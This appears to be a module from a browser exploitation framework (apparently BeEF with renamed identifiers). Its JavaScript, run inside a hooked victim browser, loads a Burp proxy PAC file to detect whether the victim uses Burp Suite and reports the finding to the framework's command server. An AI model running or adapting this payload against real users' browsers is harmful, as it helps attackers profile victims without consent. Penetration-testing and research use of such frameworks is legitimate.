//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

  load_script = function(url) {
    var s = document.createElement("script");
    s.type = 'text/javascript';
    s.src  = url;
    document.body.appendChild(s);
  }

  get_proxy = function() {
    try {
      var response = FindProxyForURL('', '');
      server.debug("Response: " + response);
      server.net.send("<%= @command_url %>", <%= @command_id %>,
        "has_burp=true&response=" + response, server.are.status_success());
    } catch(e) {
      server.debug("Response: " + e.message);
      server.net.send("<%= @command_url %>", <%= @command_id %>, "has_burp=false", server.are.status_error());
    }
  }

  load_script("http://burp/proxy.pac");
  setTimeout("get_proxy()", 10000);

});

